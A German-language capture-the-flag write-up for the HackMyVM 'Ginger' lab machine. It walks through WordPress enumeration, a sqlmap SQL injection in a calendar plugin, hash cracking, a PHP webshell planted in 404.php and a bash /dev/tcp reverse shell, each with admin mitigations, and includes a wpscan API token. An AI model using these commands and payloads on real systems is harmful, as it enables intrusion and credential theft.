@@ -1,0 +1,673 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ginger - HackMyVM - Hard - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg"> <!-- CSS muss background-color: #03b5f5; setzen -->
+        <h1>Ginger - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- CSS muss hier die Farbe auf Rot setzen -->
+            <h2>Hard</h2>
+            <div class="circle">
+                 <!-- CSS muss hier die Farbe auf Rot setzen -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- CSS muss hier die Hintergrundfarbe auf ein passendes Rot setzen -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">WordPress (Theme Editor)</div>
+                <div class="tool-item">php (system())</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">dmesg</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">Flask (Debugger)</div>
+                <div class="tool-item">openssl</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der `arp-scan -l`-Befehl wird verwendet, um aktive Hosts im lokalen Netzwerksegment zu entdecken, indem ARP-Anfragen gesendet werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP-Adresse <span class="command">192.168.2.131</span> und der MAC-Adresse `08:00:27:ee:b3:42` (zugehörig zu PCS Systemtechnik GmbH, oft ein Indikator für VirtualBox) wird identifiziert. Dies ist unser potenzielles Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die IP-Adresse 192.168.2.131. Führen Sie als Nächstes einen detaillierten Portscan (z.B. mit `nmap`) auf diese IP durch, um offene Dienste zu identifizieren.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung können helfen, die Sichtbarkeit von Hosts zu begrenzen. Implementieren Sie ggf. Maßnahmen gegen ARP-Scanning oder ARP-Spoofing.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.131	08:00:27:ee:b3:42	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nmap` wird verwendet, um das Ziel (IP wurde hier zu 192.168.2.135 geändert, wichtig!) auf offene Ports und Dienste zu scannen.
+            <ul><li><code>-sC</code>: Führt Standard-Skripte aus.</li><li><code>-T5</code>: Sehr schnelles Timing (potenziell ungenau/auffällig).</li><li><code>-sS</code>: SYN-Scan (Stealth).</li><li><code>-A</code>: Aktiviert OS/Versionserkennung, Skript-Scan, Traceroute.</li><li><code>-p-</code>: Scannt alle TCP-Ports.</li><li><code>| grep open</code>: Filtert die Ausgabe, um nur Zeilen mit offenen Ports anzuzeigen.</li></ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+            <ul><li><span class="command">Port 22 (SSH)</span>: OpenSSH 7.9p1 auf Debian 10. Ein Standard-Login-Dienst.</li><li><span class="command">Port 80 (HTTP)</span>: Apache httpd 2.4.38 auf Debian. Ein Webserver läuft.</li></ul>
+            Diese beiden Dienste sind die primären Angriffsvektoren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 gründlich (Verzeichnis-Enumeration, Schwachstellen-Scans). Halten Sie SSH als potenziellen Zugangspunkt im Auge, falls Zugangsdaten gefunden werden.
+            <br><strong>Empfehlung (Admin):</strong> Halten Sie SSH und Apache auf dem neuesten Stand. Konfigurieren Sie Apache sicher (z.B. unnötige Module deaktivieren, Informationslecks minimieren). Beschränken Sie den Zugriff auf die Dienste, wenn möglich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">nmap -sC -T5 -sS -A 192.168.2.135 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span></pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver (Port 80) zu finden.
+             <ul><li><code>dir</code>: Verzeichnis-/Datei-Modus.</li><li><code>-u http://192.168.2.135</code>: Ziel-URL.</li><li><code>-w ...medium.txt</code>: Mittelgroße Wortliste.</li><li><code>-x ...</code>: Zu testende Dateierweiterungen.</li><li><code>-e</code>: Erweiterte URL-Ausgabe.</li><li><code>--wildcard</code>: Wird verwendet, um Wildcard-Antworten zu erkennen (wenn der Server für nicht existierende Seiten immer mit 200 OK antwortet, anstatt 404).</li></ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert einen wichtigen Endpunkt: `<span class="command">http://192.168.2.135/wordpress/wp-json/wp/v2/users/</span>`. Dies ist der REST-API-Endpunkt von WordPress, der standardmäßig Benutzerinformationen (Benutzernamen, Namen, IDs) preisgibt, wenn er nicht eingeschränkt ist. Die Erkennung von `/wordpress/` deutet stark auf eine WordPress-Installation hin.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Rufen Sie den gefundenen Endpunkt (`.../wp-json/wp/v2/users/`) im Browser oder mit `curl` auf, um Benutzernamen zu enumerieren.</li><li>Führen Sie einen dedizierten WordPress-Scan mit `wpscan` auf `http://192.168.2.135/wordpress/` durch, um Themes, Plugins, Versionen und spezifische Schwachstellen zu identifizieren.</li></ol>
+             <strong>Empfehlung (Admin):</strong>
+             <ol><li>Deaktivieren oder beschränken Sie den WordPress-REST-API-Endpunkt für Benutzer, wenn er nicht benötigt wird (z.B. über Plugins oder Code-Snippets), um Benutzer-Enumeration zu verhindern.</li><li>Halten Sie die WordPress-Installation (Core, Themes, Plugins) immer aktuell.</li><li>Entfernen Sie nicht verwendete Themes und Plugins.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.135 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg -e --wildcard</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[...]
+<span class="command">/wordpress</span>            (Status: 301) [Size: 324] [--> http://192.168.2.135/wordpress/]
+[...]
+<span class="command">http://192.168.2.135/wordpress/wp-json/wp/v2/users/</span> (Status: 200) [Size: XXX] <span class="comment">(Größe hier geschätzt, da nicht in Ausgabe)</span>
+[...]
+===============================================================
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wpscan`, ein spezialisierter WordPress-Sicherheitsscanner, wird auf die vermutete Login-Seite (`.../wp-login.php`) und dann auf das Hauptverzeichnis (`.../wordpress/`) mit aggressiver Plugin-Erkennung angewendet. Es wird ein API-Token verwendet, das über einen WordPress.com-Account bezogen wurde, um Zugriff auf aktuellere Schwachstelleninformationen zu erhalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei Plugins:
+            <ul><li>`akismet`: Version 4.1.9 (veraltet, aktuell wäre 5.0).</li><li>`<span class="command">cp-multi-view-calendar</span>`: Aktuelle Version 1.4.06. Wichtig: Das Verzeichnislisting ist für dieses Plugin aktiviert (`Directory listing is enabled`), was oft ein Zeichen für Fehlkonfigurationen ist und die Untersuchung erleichtert.</li></ul>
+            Die Identifizierung von `cp-multi-view-calendar` ist besonders relevant, da Plugins oft Schwachstellen aufweisen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Suchen Sie nach bekannten Schwachstellen für `cp-multi-view-calendar` Version 1.4.06 oder früher (z.B. mit `searchsploit` oder online Exploit-Datenbanken).</li><li>Untersuchen Sie das Plugin-Verzeichnis manuell, da das Directory Listing aktiviert ist (`http://192.168.2.135/wordpress/wp-content/plugins/cp-multi-view-calendar/`).</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Aktualisieren Sie alle Plugins (insbesondere Akismet) und Themes auf die neueste Version.</li><li>Deaktivieren Sie das Verzeichnislisting für das gesamte Webserver-Verzeichnis (`Options -Indexes` in Apache `.htaccess` oder Konfiguration).</li><li>Entfernen Sie nicht benötigte Plugins.</li><li>Verwenden Sie ein Sicherheitsplugin für WordPress, das regelmäßige Scans durchführt.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~/wordpress/wp-admin]
+└─# <span class="command">wpscan --url http://192.168.2.135/wordpress/wp-login.php</span></div>
+                     <pre>[...] <span class="comment">(Ausgabe zeigt Basisinformationen, evtl. Version)</span></pre>
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~/wordpress/wp-admin]
+└─# <span class="command">wpscan --url http://192.168.2.135/wordpress/ -e ap --no-banner --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY --force --plugins-detection aggressive</span></div>
+                     <pre>
+[...]
+[i] Plugin(s) Identified:
+
+[+] <span class="command">akismet</span>
+ | Location: http://192.168.2.135/wordpress/wp-content/plugins/akismet/
+ | Last Updated: 2022-07-26T16:13:00.000Z
+ | Readme: http://192.168.2.135/wordpress/wp-content/plugins/akismet/readme.txt
+ | <span class="password">[!] The version is out of date, the latest version is 5.0</span>
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.2.135/wordpress/wp-content/plugins/akismet/, status: 200
+ |
+ | Version: <span class="command">4.1.9</span> (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.2.135/wordpress/wp-content/plugins/akismet/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://192.168.2.135/wordpress/wp-content/plugins/akismet/readme.txt
+
+[+] <span class="command">cp-multi-view-calendar</span>
+ | Location: http://192.168.2.135/wordpress/wp-content/plugins/cp-multi-view-calendar/
+ | Latest Version: 1.4.06
+ | Last Updated: 2022-05-23T17:04:00.000Z
+ | Readme: http://192.168.2.135/wordpress/wp-content/plugins/cp-multi-view-calendar/README.txt
+ | <span class="password">[!] Directory listing is enabled</span>
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.2.135/wordpress/wp-content/plugins/cp-multi-view-calendar/, status: 200
+ | Confirmed By: Direct Access (Aggressive Detection)
+ |  - http://192.168.2.135/wordpress/wp-content/plugins/cp-multi-view-calendar/
+
+[...]
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `searchsploit`, ein Kommandozeilentool zur Abfrage der Exploit-DB, wird verwendet, um nach bekannten Exploits für das Plugin `cp-multi-view-calendar` zu suchen. Anschließend wird `sqlmap`, ein automatisches SQL-Injection-Tool, auf eine URL angewendet, die offenbar als anfällig für SQL-Injection im Parameter `id` identifiziert wurde (vermutlich basierend auf den `searchsploit`-Ergebnissen oder manueller Prüfung). Die Optionen `--risk 3` und `--level 5` erhöhen die Gründlichkeit und Aggressivität der Tests. `--dbs` versucht, die Namen der verfügbaren Datenbanken aufzulisten. `--batch` akzeptiert Standardantworten für alle Abfragen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sqlmap` bestätigt die SQL-Injection-Schwachstelle im Parameter `id` der angegebenen URL. Es kann erfolgreich die Namen der Datenbanken extrahieren: `<span class="command">information_schema</span>` (Standard-Metadatenbank) und `<span class="command">wordpress_db</span>` (die Datenbank der WordPress-Installation). Dies ist ein kritischer Erfolg, der den Zugriff auf die WordPress-Daten ermöglicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Nachdem die Datenbank `wordpress_db` identifiziert wurde, verwenden Sie `sqlmap`, um die Tabellen (`-D wordpress_db --tables`) und insbesondere den Inhalt der Benutzertabelle (`-D wordpress_db -T wp_users --dump`) zu extrahieren.</li><li>Suchen Sie in den extrahierten Daten nach Benutzer-Hashes oder anderen sensiblen Informationen.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Aktualisieren oder ersetzen Sie das anfällige Plugin `cp-multi-view-calendar` sofort.</li><li>Implementieren Sie Prepared Statements oder eine ordnungsgemäße Eingabevalidierung/-sanitisierung in allen Datenbankabfragen, um SQL-Injection zu verhindern.</li><li>Beschränken Sie die Berechtigungen des Datenbankbenutzers (`wordpress_user`), den die Webanwendung verwendet, auf das absolute Minimum (Least Privilege).</li><li>Erwägen Sie den Einsatz einer Web Application Firewall (WAF), um SQL-Injection-Versuche zu erkennen und zu blockieren.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">searchsploit cp-multi-view-calendar</span></div>
+                    <pre><span class="comment">[Ausgabe von searchsploit, die wahrscheinlich auf SQLi hinweist - nicht im Text enthalten]</span></pre>
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">sqlmap -u 'http://192.168.2.135/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1'  -p id --risk 3 --level 5 --dbs --batch</span></div>
+                    <pre>
+[...]
+<span class="password">parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
+sqlmap identified the following injection point(s) with a total of XXX HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=data_management&cpmvc_do_action=mvparse&f=edit&id=1 AND 6129=6129
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=data_management&cpmvc_do_action=mvparse&f=edit&id=1 AND (SELECT 8487 FROM (SELECT(SLEEP(5)))nJGU)
+---
+<span class="password">available databases [2]:</span>
+[*] <span class="command">information_schema</span>
+[*] <span class="command">wordpress_db</span>
+[...]
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=data_management&cpmvc_do_action=mvparse&f=edit&id=1 AND 6129=6129
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=data_management&cpmvc_do_action=mvparse&f=edit&id=1 AND (SELECT 8487 FROM (SELECT(SLEEP(5)))nJGU)
+---
+available databases [2]:
+[*] information_schema
+[*] wordpress_db
+
+fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.2.135'
+
+sqlmap saved session to '/root/.local/share/sqlmap/output/192.168.2.135/session.sqlite'
+[*] ending @ ...
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird erneut ausgeführt, diesmal mit dem Ziel, den Inhalt der Tabelle `wp_users` aus der Datenbank `wordpress_db` zu extrahieren (`--dump`). Die Option `--dump-format html` wurde im Befehl angegeben, aber die Ausgabe sieht nach der Standard-Konsolenausgabe aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich und extrahiert die Daten des WordPress-Benutzers. Ein Benutzer wird gefunden:
+            <ul><li>Benutzername (`user_login`): `<span class="command">webmaster</span>`</li><li>Passwort-Hash (`user_pass`): `<span class="password">$P$BsyLMheEjjRPfxertXBQWm6Nq8.YBr.</span>`</li><li>E-Mail: `webmaster@gmail.com`</li></ul>
+            Der Passwort-Hash ist im Format von phpass (WordPress Portable Hash), was für `hashcat` Modus 400 relevant ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den extrahierten Passwort-Hash `$P$BsyLMheEjjRPfxertXBQWm6Nq8.YBr.` mit `hashcat` (Modus `-m 400`) und einer geeigneten Wortliste (z.B. `rockyou.txt`) zu knacken. Wenn erfolgreich, verwenden Sie die Zugangsdaten (`webmaster`:<gefundenes_passwort>), um sich im WordPress-Adminbereich (`/wp-login.php`) anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke Passwörter für alle WordPress-Benutzer. Verwenden Sie keine Standard-Benutzernamen wie `admin` oder `webmaster`. Sichern Sie die Datenbank gegen SQL-Injection ab (siehe vorherige Empfehlung).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">sqlmap -u 'http://192.168.2.135/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1'  -p id --risk 3 --level 5  -D wordpress_db -T wp_users --dump</span></div>
+                     <pre>[...]</pre>
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">sqlmap --url "http://192.168.2.135/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=datafeed&method=adddetails&id=1&calid=1" -D wordpress_db -T wp_users --dump --dump-format html</span></div>
+                    <pre>
+[...]
+Database: wordpress_db
+Table: wp_users
+[1 entry]
++----+-------------------------------+------------------------------------+---------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url                      | user_pass                          | user_email          | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+-------------------------------+------------------------------------+---------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | http://192.168.0.14/wordpress | <span class="password">$P$BsyLMheEjjRPfxertXBQWm6Nq8.YBr.</span> | <span class="command">webmaster@gmail.com</span> | <span class="command">webmaster</span>  | 0           | <span class="command">webmaster</span>    | <span class="command">webmaster</span>     | 2021-06-02 05:28:40 | <blank>             |
++----+-------------------------------+------------------------------------+---------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+[...]
+</pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Der extrahierte WordPress-Passwort-Hash wird in eine Datei `hashcat.txt` geschrieben (via `vi`). Anschließend wird `hashcat` verwendet, um diesen Hash zu knacken.
+             <ul><li><code>-a 0</code>: Wörterbuchangriff.</li><li><code>-m 400</code>: Hash-Modus für phpass (WordPress MD5 Portable Hash, $P$).</li><li><code>hashcat.txt</code>: Datei mit dem Hash.</li><li><code>/usr/share/wordlists/rockyou.txt</code>: Wörterbuchdatei.</li></ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Hashcat ist erfolgreich!</span> Das Passwort für den Hash `$P$BsyLMheEjjRPfxertXBQWm6Nq8.YBr.` wird als `<span class="password">sanitarium</span>` identifiziert. Dies liefert die Zugangsdaten für den WordPress-Benutzer `webmaster`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich mit den Zugangsdaten `webmaster`:`sanitarium` im WordPress-Adminbereich unter `http://192.168.2.131/wordpress/wp-login.php` an. Suchen Sie nach Möglichkeiten, Code auszuführen (z.B. Theme/Plugin-Editor, Datei-Upload).
+             <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke, einzigartige Passwörter, die nicht in gängigen Wortlisten wie `rockyou.txt` vorkommen. Überwachen Sie fehlgeschlagene Login-Versuche.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre># Inhalt von hashcat.txt: $P$BsyLMheEjjRPfxertXBQWm6Nq8.YBr.</pre>
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">hashcat -a 0 -m 400 hashcat.txt /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+hashcat (v6.2.5) starting...
+[...]
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+[...]
+<span class="password">$P$BsyLMheEjjRPfxertXBQWm6Nq8.YBr.:sanitarium</span>
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: phpass, WordPress (MD5), Joomla (MD5)
+Hash.Target......: $P$BsyLMheEjjRPfxertXBQWm6Nq8.YBr.
+Time.Started.....: [...]
+Time.Estimated...: 0 secs
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#*.........: [...]
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: [...]
+Rejected.........: [...]
+Restore.Point....: [...]
+Restore.Sub.#*...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#*....: [...]
+Hardware.Mon.#*..: [...]
+Started: [...]
+Stopped: [...]
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem erfolgreichen Knacken des Passworts wird der Plan formuliert, sich im WordPress-Adminbereich anzumelden. Anschließend wird der Inhalt der `404.php`-Datei des `twentynineteen`-Themes angezeigt. Diese Datei wurde offenbar über den WordPress-Adminbereich (Aussehen -> Theme-Datei-Editor) modifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `404.php`-Datei enthält nun am Anfang den PHP-Code: `<span class="password">system($GET['cmd']);</span>`. Dies ist eine einfache Webshell/ein Backdoor. Jedes Mal, wenn eine nicht existierende Seite aufgerufen wird (was die 404.php auslöst), wird der Wert des GET-Parameters `cmd` als Systembefehl auf dem Server ausgeführt. Dies ist ein klassischer Weg, um nach Erlangung von Admin-Zugriff auf WordPress Codeausführung zu erreichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Verwenden Sie die Backdoor, um Befehle auszuführen. Testen Sie mit einfachen Befehlen wie `id` oder `ls`: `http://192.168.2.131/wordpress/wp-content/themes/twentynineteen/404.php?cmd=id`.</li><li>Nutzen Sie die Backdoor, um eine stabilere Reverse Shell zu erhalten. Der im Text vorgeschlagene Payload `bash -c 'bash -i >& /dev/tcp/192.168.2.140/9001 0>&1'` ist geeignet. Starten Sie einen Listener (`nc -lvnp 9001`) und rufen Sie die URL mit dem URL-kodierten Payload auf: `http://192.168.2.131/wordpress/wp-content/themes/twentynineteen/404.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27`</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Deaktivieren Sie den Theme- und Plugin-Editor im WordPress-Adminbereich (`define( 'DISALLOW_FILE_EDIT', true );` in `wp-config.php`), um solche Modifikationen zu verhindern.</li><li>Überwachen Sie die Integrität von WordPress-Core-, Theme- und Plugin-Dateien (z.B. mit Wordfence oder Sucuri).</li><li>Beschränken Sie die Berechtigungen des Webserver-Benutzers (`www-data`) so weit wie möglich.</li><li>Stellen Sie die Original-`404.php`-Datei wieder her und überprüfen Sie andere Theme-Dateien auf ähnliche Backdoors.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Login-Versuch (Gedanklich):
+URL: http://192.168.2.131/wordpress/wp-login.php/
+Username: webmaster
+Password: sanitarium
+
+<span class="comment">--- Inhalt von 404.php (nach Modifikation) ---</span>
+<span class="password">system($GET['cmd']);</span>
+
+/
+  The template for displaying 404 pages (not found)
+
+  [Link: https://codex.wordpress.org/Creating_an_Error_404_Page | Ziel: https://codex.wordpress.org/Creating_an_Error_404_Page]
+
+  @package WordPress
+  @subpackage Twenty_Nineteen
+  @since Twenty Nineteen 1.0
+ /
+
+get_header();
+?>
+
+	<section id="primary" class="content-area">
+		<main id="main" class="site-main">
+
+			<div class="error-404 not-found">
+				<header class="page-header">
+					<h1 class="page-title"><?php _e( 'Oops! That page can’t be found.', 'twentynineteen' ); ?></h1>
+				</header><!-- .page-header -->
+
+				<div class="page-content">
+					<p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentynineteen' ); ?></p>
+					<?php get_search_form(); ?>
+				</div><!-- .page-content -->
+			</div><!-- .error-404 -->
+
+		</main><!-- .site-main -->
+	</section><!-- .content-area -->
+ 
+get_footer();
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">Beispiel-URLs für Backdoor:</span>
+<span class="command">http://192.168.2.131/wordpress/wp-content/themes/twentynineteen/404.php?cmd=ls</span>
+<span class="command">http://192.168.2.131/wordpress/wp-content/themes/twentynineteen/404.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem die Reverse Shell über die `404.php`-Backdoor erfolgreich etabliert wurde (dies wird hier angenommen, da der Prompt `www-data@ginger:...` zeigt), wird `sudo -l` ausgeführt, um die `sudo`-Berechtigungen des `www-data`-Benutzers zu überprüfen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `www-data`-Benutzer hat die Berechtigung, den Befehl `/usr/bin/sl` (Steam Locomotive) als jeder Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD`) auszuführen. Dies ist eine ungewöhnliche, aber spezifische Berechtigung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese `sudo`-Regel scheint auf den ersten Blick nicht direkt für Privilege Escalation nützlich zu sein, da `sl` selbst normalerweise keine Shell oder Dateimanipulation ermöglicht. Untersuchen Sie jedoch, ob `sl` ungewöhnliche Umgebungsvariablen interpretiert oder ob es in dieser spezifischen Version eine bekannte Schwachstelle gibt (unwahrscheinlich). Konzentrieren Sie sich auf andere Enumerationsschritte als `www-data`.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige `sudo`-Regeln. Es gibt selten einen legitimen Grund, `www-data` die Ausführung von `sl` mit `sudo` zu erlauben. Vergeben Sie `sudo`-Rechte nach dem Least Privilege Prinzip.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@ginger:/var/www/html/wordpress/wp-content/themes/twentynineteen$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for www-data on ginger:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on ginger:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/sl</span>
+</pre>
+                 </div>
+             </div>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis (`/home`) wird aufgelistet, um die vorhandenen Benutzer-Home-Verzeichnisse zu sehen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es gibt Home-Verzeichnisse für `caroline`, `sabrina` und `webmaster`. Die Berechtigungen für `caroline` (`drwxr-xr--`) deuten darauf hin, dass `www-data` (als 'other') keinen Zugriff hat, während `webmaster` (als Besitzer) und die Gruppe `webmaster` (zu der `www-data` gehören könnte, aber unwahrscheinlich ist) Zugriff haben könnten. Die Gruppe für `caroline` ist `webmaster`. Das Verzeichnis von `sabrina` ist für `www-data` lesbar (`drwxr-xr-x`). Das Verzeichnis von `webmaster` ist nur für den Besitzer lesbar (`drwx------`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `/home/sabrina`-Verzeichnis, da es für `www-data` lesbar ist. Suchen Sie dort nach interessanten Dateien, Skripten oder Hinweisen. Prüfen Sie, ob `www-data` zur Gruppe `webmaster` gehört (`id www-data`), um zu sehen, ob Zugriff auf `/home/caroline` möglich ist.
+             <br><strong>Empfehlung (Admin):</strong> Setzen Sie restriktive Berechtigungen für Home-Verzeichnisse (maximal `750` oder `700`), um den Zugriff durch andere Benutzer, einschließlich des Webserver-Benutzers, zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
